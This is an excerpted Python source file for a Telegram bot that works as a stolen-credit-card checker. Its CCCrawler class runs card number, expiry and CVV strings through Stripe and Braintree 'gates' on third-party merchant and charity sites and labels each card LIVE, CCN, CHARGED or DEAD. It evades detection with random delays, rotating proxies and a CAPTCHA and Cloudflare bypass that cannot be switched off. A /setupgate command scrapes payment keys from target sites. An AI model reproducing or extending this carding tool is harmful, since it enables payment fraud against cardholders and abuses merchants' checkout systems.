...
def live():
    try:
        from keep_alive import live as _live
        _live()
    except Exception:
        pass
...
def _create_dispatcher(bot):
    """Create Dispatcher compatible with aiogram 2.x and 3.x signatures."""
    if AIROGRAM_V3:
        return Dispatcher()
...
from stripe_auth import check_stripe_auth, setup_stripe_auth_from_url
from stripe_intent import check_stripe_intent, setup_stripe_intent_from_url
from braintree_auth import check_braintree_auth, setup_braintree_auth_from_url
...
def _classify_auth_type(tag, detail):
    ...
    if any(s in d for s in ["insufficient", "cvv", "cvc", "security", "funds"]):
        return "CCN ✅", "Card live (Bank response)"
...
def _fmt_stripe_auth_settings(settings, compact=False):
    site = settings.get('site_url', 'Not set')
    raw_key = settings.get('stripe_pub_key', '')
    pk_len = 20
    key_display = f"<code>{raw_key[:pk_len]}{'...' if len(raw_key) > pk_len else ''}</code>" if raw_key else "<i>Default</i>"
    if compact:
        return (
            f"🔑  Key: {key_display}\n"
        )
...
def _fmt_stripe_intent_settings(settings, compact=False):
    site = settings.get('site_url', 'Not set')
    raw_key = settings.get('stripe_pub_key', '')
    pk_len = 20
    key_display = f"<code>{raw_key[:pk_len]}{'...' if len(raw_key) > pk_len else ''}</code>" if raw_key else "<i>Default</i>"
...
def _fmt_braintree_auth_settings(settings, compact=False):
    site = settings.get('site_url', 'Not set')
    email = settings.get('login_email', '') or '<i>Default pool</i>'
    pwd = settings.get('login_password', '')
    pwd_display = '***' if pwd else '<i>Default</i>'
    merchant = settings.get('merchant_id', '')
    if compact:
        return (
            f"📧  Login: {email}\n"
    ...
    return (
        ...
        f"     <code>{site}</code>\n"
        f"📧  Login Email: {email}\n"
        f"🔒  Login Password: {pwd_display}\n"
        f"🏪  Merchant ID: <code>{merchant}</code>\n"
    )
...
def _fmt_gate_settings(settings, gate_type, compact=False):
    if gate_type == "braintree":
        ...
        return _fmt_stripe_auth_settings(settings, compact)
    elif gate_type == "stripe_intent":
        return _fmt_stripe_intent_settings(settings, compact)
    elif gate_type == "braintree_auth":
        return _fmt_braintree_auth_settings(settings, compact)
...
class CCCrawler:
    ...
    async def check_stripe_auth_gate(self, card_str):
        try:
            parts = card_str.split('|')
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            loop = asyncio.get_event_loop()
            ...
            status = result.get('status', 'declined')
            detail = result.get('detail', 'Unknown')
            gate_name = result.get('gate', 'Stripe Auth')
            if status == 'error':
                self._gate_errors += 1
                return False, "ERROR", detail, gate_name, elapsed
            self._gate_errors = 0
            if status in ('live', 'charged', 'ccn'):
                tag = "CCN" if status == 'ccn' else ("CHARGED" if status == 'charged' else "LIVE")
                return True, tag, detail, gate_name, elapsed
            return False, "DEAD", detail, gate_name, elapsed
        except Exception as e:
            self._gate_errors += 1
            logger.error(f"Stripe Auth Error: {str(e)[:80]}")
        return False, "ERROR", "Gate Error", "Stripe Auth", 0.0

    async def check_stripe_intent_gate(self, card_str):
        try:
            parts = card_str.split('|')
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            loop = asyncio.get_event_loop()
            ...
            status = result.get('status', 'declined')
            detail = result.get('detail', 'Unknown')
            gate_name = result.get('gate', 'Stripe Intent')
            if status == 'error':
                self._gate_errors += 1
                return False, "ERROR", detail, gate_name, elapsed
            self._gate_errors = 0
            ...
            self._gate_errors += 1
            logger.error(f"Stripe Intent Error: {str(e)[:80]}")
        return False, "ERROR", "Gate Error", "Stripe Intent", 0.0

    async def check_braintree_auth_gate(self, card_str):
        try:
            parts = card_str.split('|')
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            loop = asyncio.get_event_loop()
            ...
            status = result.get('status', 'declined')
            detail = result.get('detail', 'Unknown')
            gate_name = result.get('gate', 'Braintree Auth')
            proxy_used = result.get('proxy_used')
            self._last_bt_auth_proxy = proxy_used
            if status == 'error':
                self._gate_errors += 1
                return False, "ERROR", detail, gate_name, elapsed
            self._gate_errors = 0
            ...
            self._gate_errors += 1
            logger.error(f"Braintree Auth Error: {str(e)[:80]}")
        return False, "ERROR", "Gate Error", "Braintree Auth", 0.0
    ...
    async def check_card(self, card_str, gate_type="stripe"):
        ...
        if gate_type == "braintree":
            ...
            is_live, tag, detail, gate_name, check_time = await self.check_stripe_auth_gate(card_str)
            base_delay = random.uniform(2.0, 4.0)
            await asyncio.sleep(base_delay)

        elif gate_type == "stripe_intent":
            is_live, tag, detail, gate_name, check_time = await self.check_stripe_intent_gate(card_str)
            base_delay = random.uniform(2.0, 4.0)
            await asyncio.sleep(base_delay)

        elif gate_type == "braintree_auth":
            is_live, tag, detail, gate_name, check_time = await self.check_braintree_auth_gate(card_str)
            proxy_used = getattr(self, '_last_bt_auth_proxy', None)
...
async def _send_proxy_file_to_channel(chat_id, bot=None):
...
def register_handlers(dp):
    ...
    async def cmd_help(message: Message):
        ...
        await message.reply(
            ...
            "/captcha <code>[on|off|key|stats]</code> — CAPTCHA solver\n"
    ...
    async def cmd_gate(message: Message):
        ...
        settings_block = f"\n<b>SETTINGS ({GATE_TYPE_LABELS.get(gate_type, gate_type.upper())})</b>\n" + _fmt_gate_settings(settings, gate_type)
        ...
        await message.reply(
            ...
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{status_icon}  Gate: <b>{GATE_TYPE_LABELS.get(gate_type, gate_type.upper())} {status_text}</b>\n"
    ...
    async def cmd_setgate(message: Message):
        ...
        gt_label = GATE_TYPE_LABELS.get(current_gt, current_gt.upper())
    ...
    async def cmd_captcha(message: Message):
        ...
        if not parts:
            settings = get_all_captcha_settings()
            enabled = is_captcha_enabled()
            e_icon = "🟢" if enabled else "🔴"
            has_key = bool(get_captcha_setting("api_key"))
            key_icon = "🟢" if has_key else "🔴"
            stats = get_solver_stats()

            avg_time = f"{stats['total_time'] / stats['solved']:.1f}s" if stats['solved'] > 0 else "N/A"

            mode = settings.get("mode", "Free Bypass")
            await message.reply(
                f"<b>🧩  CAPTCHA AUTO-SOLVER</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🟢 Status: <b>ALWAYS ON</b>\n"
                f"⚡ Mode: <b>{mode}</b>\n"
                f"{key_icon} API Key: <b>{'Set' if has_key else 'Not set (free bypass active)'}</b>\n"
                f"🔧 Provider: <code>{settings.get('provider', 'capsolver')}</code>\n"
                f"⏱ Timeout: <code>{settings.get('timeout', 120)}s</code>\n\n"
                f"<b>📊  STATS</b>\n"
                f"🔍 Detected: <code>{stats.get('detected', 0)}</code>\n"
                f"✅ Solved: <code>{stats.get('solved', 0)}</code>\n"
                f"❌ Failed: <code>{stats.get('failed', 0)}</code>\n"
                f"⏭ Bypassed: <code>{stats.get('bypassed', 0)}</code>\n"
                f"⏱ Avg Time: <code>{avg_time}</code>\n\n"
                f"<b>🎯  HOW IT WORKS</b>\n"
                "• Auto-detects CAPTCHAs on every page\n"
                "• Free bypass: rotates UA + proxy for CF\n"
                "• API solver: reCAPTCHA, hCaptcha, Turnstile\n"
                "• No config needed - works out of box\n\n"
                "<b>COMMANDS</b>\n"
                "<code>/captcha key [API_KEY]</code> · Set solver key (optional)\n"
                "<code>/captcha provider [name]</code> · capsolver/2captcha/anticaptcha\n"
                "<code>/captcha timeout [sec]</code> · Solve timeout\n"
                "<code>/captcha stats</code> · View solve stats\n"
                "<code>/captcha reset</code> · Reset stats\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        ...
        if cmd in ('on', 'enable'):
            await message.reply(
                "🟢 <b>CAPTCHA Auto-Solver is ALWAYS ON</b>\n\n"
                "Auto-detects and handles all CAPTCHAs automatically.\n"
                "Free bypass active for Cloudflare challenges.\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            ...
            await message.reply(
                "⚡ <b>CAPTCHA Auto-Solver cannot be disabled</b>\n\n"
                "It runs automatically in the background.\n"
                "Free bypass handles Cloudflare without API key.\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            ...
            set_captcha_setting("api_key", new_key)
            masked = f"{new_key[:8]}...{new_key[-4:]}" if len(new_key) > 12 else "***"
            await message.reply(
                f"🔑 <b>CAPTCHA API Key Updated</b>\n\n"
                f"Key: <code>{masked}</code>\n"
                f"Provider: <code>{get_captcha_setting('provider', 'capsolver')}</code>\n\n"
                "Auto-solve is now ready!\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            logger.info(f"CAPTCHA API key set by admin {message.from_user.id}")

        elif cmd == 'provider' and len(parts) > 1:
            provider = parts[1].lower().strip()
            valid_providers = ['capsolver', '2captcha', 'anticaptcha']
            if provider in valid_providers:
                set_captcha_setting("provider", provider)
                await message.reply(
                    f"🔧 <b>CAPTCHA Provider Updated</b>\n\n"
                ...
                await message.reply(
                    f"❌ Unknown provider: <code>{provider}</code>\n\n"
                    f"Available: {', '.join(valid_providers)}\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )

        elif cmd == 'timeout' and len(parts) > 1:
            try:
                timeout = int(parts[1])
                if 10 <= timeout <= 300:
                    set_captcha_setting("timeout", timeout)
                    set_captcha_setting("max_wait", timeout + 60)
                    await message.reply(
                        f"⏱ <b>CAPTCHA Timeout Updated</b>\n\n"
                        f"Timeout: <code>{timeout}s</code>\n"
                        f"Max wait: <code>{timeout + 60}s</code>\n"
                        "<code>━━ H@0 ━━</code>",
                        parse_mode='HTML'
                    )
                else:
                    await message.reply("❌ Timeout must be 10-300 seconds.", parse_mode='HTML')
            except ValueError:
                await message.reply("❌ Invalid number.", parse_mode='HTML')
            ...
            for ctype, count in stats.get("by_type", {}).items():
                label = CAPTCHA_TYPES.get(ctype, ctype)
                by_type_lines += f"  • {label}: <code>{count}</code>\n"

            await message.reply(
                f"<b>📊  CAPTCHA SOLVER STATS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔍 Detected: <code>{stats.get('detected', 0)}</code>\n"
                f"✅ Solved: <code>{stats.get('solved', 0)}</code>\n"
                f"❌ Failed: <code>{stats.get('failed', 0)}</code>\n"
            ...
            reset_solver_stats()
            await message.reply(
                "🔄 <b>CAPTCHA Stats Reset</b>\n\n"
                "All solver statistics cleared.\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            ...
            fb = parts[1].lower()
            if fb in ('retry', 'skip', 'continue'):
                set_captcha_setting("fallback", fb)
                await message.reply(
                    f"🔄 <b>CAPTCHA Fallback Updated</b>\n\n"
                    f"Fallback: <code>{fb}</code>\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            else:
                await message.reply("❌ Fallback options: retry, skip, continue", parse_mode='HTML')

        else:
            await message.reply(
                "<b>🧩  CAPTCHA COMMANDS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/captcha</code> · Show status\n"
                "<code>/captcha on/off</code> · Toggle\n"
                "<code>/captcha key [KEY]</code> · Set API key\n"
                "<code>/captcha provider [name]</code> · Set provider\n"
                "<code>/captcha timeout [sec]</code> · Set timeout\n"
                "<code>/captcha fallback [mode]</code> · retry/skip/continue\n"
                "<code>/captcha stats</code> · View stats\n"
                "<code>/captcha reset</code> · Reset stats\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
    ...
    _SCRIPT_FILES = {
        ...
        "stripe_auth": "stripe_auth.py",
        "sa": "stripe_auth.py",
        "stripe_intent": "stripe_intent.py",
        "si": "stripe_intent.py",
        "braintree_auth": "braintree_auth.py",
        "ba": "braintree_auth.py",
        "config": "config.py",
    ...
    _UPLOADABLE_SCRIPTS = {
        ...
        "stripe_auth.py": "stripe_auth",
        "stripe_intent.py": "stripe_intent",
        "braintree_auth.py": "braintree_auth",
    }
    ...
    async def cmd_exportcfg(message: Message):
        ...
        try:
            ...
            gt = GATE_TYPE_LABELS.get(data.get("gate_type", "stripe"), data.get("gate_type", "stripe").upper())
            settings_preview = ""
    ...
    async def cmd_setupgate(message: Message):
        ...
        if not args:
            await message.reply(
                ...
                "<b>🤖  AUTO-DETECTED (5 Gate Types)</b>\n"
                "🔍  Gate type auto-detected from site\n"
                "🔑  Pub Key / Token / Merchant ID\n"
                "🏷  Account / Payment forms\n"
                "📋  Checkout / Cart / Donate paths\n"
                "📄  WooCommerce / Auth forms\n"
                "🛡  PoW + CAPTCHA → auto-solve\n\n"
                "<b>🛡  GATE TYPES</b>\n"
                "  Stripe Charitable · Braintree\n"
                "  Stripe Auth · Stripe Intent\n"
                "  Braintree Auth\n\n"
                "<b>📝  USAGE</b>\n"
                "<code>/setupgate https://charity.org</code>\n"
                "<code>/setupgate https://shop.com</code>\n"
                "<code>/setupgate example.org</code>\n\n"
        ...
        try:
            ...
            detected_keys = gate_info.get("detected_keys", {})
            ...
            setup_fn = setup_funcs.get(detected_type, setup_gate_from_url)
            result = await loop.run_in_executor(None, setup_fn, url_arg)
            gate_label = GATE_TYPE_LABELS.get(detected_type, detected_type.upper())

            if manual_pk and detected_type in ("stripe", "stripe_auth", "stripe_intent"):
                pk_key = "pub_key" if detected_type == "stripe" else "stripe_pub_key"
                set_gate_setting(detected_type, pk_key, manual_pk)
                result["auto_detected"].append(f"Manual PK: {manual_pk[:20]}...")

            if detected_keys:
                valid_keys_map = {
                    "stripe": ["stripe_pub_key"],
                    "stripe_auth": ["stripe_pub_key"],
                    "stripe_intent": ["stripe_pub_key"],
                    "braintree_auth": ["merchant_id"],
                    "braintree": [],
                }
                allowed = valid_keys_map.get(detected_type, [])
                for dk, dv in detected_keys.items():
                    if dk in allowed:
                        set_gate_setting(detected_type, dk, dv)

            detected_lines = f"  🔍  Gate: <b>{gate_label}</b> ({confidence} confidence)\n"
            if signals:
                detected_lines += f"  📡  Signals: <code>{', '.join(signals[:6])}</code>\n"
    ...
    async def cmd_panel(message: Message):
        ...
        gate_type_label = GATE_TYPE_LABELS.get(active_gt, active_gt.upper())
    ...
    async def cmd_sendproxies(message: Message):
        ...
        active_chat = get_active_chat_id()
        ok, msg = await _send_proxy_file_to_channel(active_chat, message.bot)
        if ok:
    ...
    async def cmd_configs(message: Message):
        ...
        for cid, cfg in sorted(configs.items()):
            ...
            gt_label = GATE_TYPE_LABELS.get(gt, gt.upper())
            st = cfg.get("settings", {})
        ...
        await message.reply(
            ...
            f"<code>/newconfig [type] [name]</code>\n"
    ...
    async def cmd_newconfig(message: Message):
        ...
        if parts:
            first = parts[0].lower()
            resolved = GATE_TYPE_ALIASES.get(first)
            if resolved:
                gate_type = resolved
        ...
        if cid is None:
            ...
            return
        cfg = get_config(cid)
        gt_label = GATE_TYPE_LABELS.get(gate_type, gate_type.upper())
        types_list = "\n".join(f"  <code>/newconfig {alias} [name]</code>" for alias in ["stripe", "braintree", "stripe_auth", "stripe_intent", "braintree_auth"])
        await message.reply(
    ...
    async def cmd_editconfig(message: Message):
        ...
        gate_types_hint = "stripe|braintree|stripe_auth|stripe_intent|braintree_auth"
        ...
        if gt == "braintree":
            edit_block = (
                ...
                f"<code>/setconfig {cid} gatetype [{gate_types_hint}]</code>\n"
            )
        elif gt == "stripe_auth":
            edit_block = (
                f"\n<b>EDIT</b>\n"
                f"<code>/setconfig {cid} site [url]</code>\n"
                f"<code>/setconfig {cid} key [pk_live_...]</code>\n"
                f"<code>/setconfig {cid} gatetype [{gate_types_hint}]</code>\n"
            )
        elif gt == "stripe_intent":
            edit_block = (
                f"\n<b>EDIT</b>\n"
                f"<code>/setconfig {cid} site [url]</code>\n"
                f"<code>/setconfig {cid} key [pk_live_...]</code>\n"
        ...
        elif gt == "braintree_auth":
            edit_block = (
                f"\n<b>EDIT</b>\n"
                f"<code>/setconfig {cid} site [url]</code>\n"
                f"<code>/setconfig {cid} login_email [email]</code>\n"
                f"<code>/setconfig {cid} login_password [pwd]</code>\n"
                f"<code>/setconfig {cid} merchant_id [id]</code>\n"
                f"<code>/setconfig {cid} gatetype [{gate_types_hint}]</code>\n"
            )
        else:
            edit_block = (
    ...
    async def cmd_setconfig(message: Message):
        ...
        if setting_key == 'gatetype':
            resolved_gt = GATE_TYPE_ALIASES.get(setting_value.lower())
            if resolved_gt:
                set_config_gate_type(cid, resolved_gt)
                gt_label = GATE_TYPE_LABELS.get(resolved_gt, resolved_gt.upper())
                await message.reply(
                    f"<b>✅  CONFIG #{cid} GATE TYPE</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🛡  Gate changed to: <b>{gt_label}</b>\n"
                ...
                types_str = ', '.join(f"<code>{t}</code>" for t in ALL_GATE_TYPES)
                await message.reply(f"❌ Valid gate types: {types_str}", parse_mode='HTML')
                return
        ...
        elif cfg_gt == "stripe_auth":
            key_map = {
                'site': ('site_url', '🌐 Site URL'),
                'url': ('site_url', '🌐 Site URL'),
                'key': ('stripe_pub_key', '🔑 Stripe Pub Key'),
                'pubkey': ('stripe_pub_key', '🔑 Stripe Pub Key'),
            }
        elif cfg_gt == "stripe_intent":
            key_map = {
                'site': ('site_url', '🌐 Site URL'),
                'url': ('site_url', '🌐 Site URL'),
                'key': ('stripe_pub_key', '🔑 Stripe Pub Key'),
        ...
        elif cfg_gt == "braintree_auth":
            key_map = {
                'site': ('site_url', '🌐 Site URL'),
                'url': ('site_url', '🌐 Site URL'),
                'login_email': ('login_email', '📧 Login Email'),
                'email': ('login_email', '📧 Login Email'),
        ...
        if setting_key not in key_map:
            ...
            await message.reply(
                f"❌ Unknown setting: <code>{setting_key}</code>\n\n"
                f"Gate: <b>{GATE_TYPE_LABELS.get(cfg_gt, cfg_gt.upper())}</b>\n"
    ...
    async def cmd_setupconfig(message: Message):
        ...
        try:
            ...
            setup_fn = setup_funcs.get(detected_type, setup_gate_from_url)
            result = await loop.run_in_executor(None, setup_fn, url)
            gate_label = GATE_TYPE_LABELS.get(detected_type, detected_type.upper())

            if manual_pk and detected_type in ("stripe", "stripe_auth", "stripe_intent"):
                pk_key = "pub_key" if detected_type == "stripe" else "stripe_pub_key"
                set_gate_setting(detected_type, pk_key, manual_pk)
                set_config_setting(cid, pk_key, manual_pk)
                result["auto_detected"].append(f"Manual PK: {manual_pk[:20]}...")
        ...
        if data == "panel":
            ...
            try:
                ...
                if set_active_config(cfg_id):
                    cfg_info = get_config(cfg_id)
                    name = cfg_info['name'] if cfg_info else f"Config #{cfg_id}"
                    gt = GATE_TYPE_LABELS.get(cfg_info.get('gate_type', 'stripe'), cfg_info.get('gate_type', 'stripe').upper()) if cfg_info else "?"
                    await callback.bot.send_message(
                        callback.message.chat.id,
...
async def main_loop():
    ...
    dp = _enable_aiogram_v2_style_handlers(_create_dispatcher(bot))
    crawler = CCCrawler()
    ...
    async def _proxy_stats_callback(stats):
        ...
        try:
            ...
            if get_notify("proxy_file"):
                await _send_proxy_file_to_channel(get_active_chat_id(), bot)
        except Exception:
            pass
    ...
    try:
        ...
        startup_gt = GATE_TYPE_LABELS.get(active_cfg_startup.get("gate_type", "stripe"), "STRIPE")
        ...
        for cid_s, cfg_s in all_cfgs.items():
            gt_s = GATE_TYPE_LABELS.get(cfg_s.get("gate_type", "stripe"), "STRIPE")
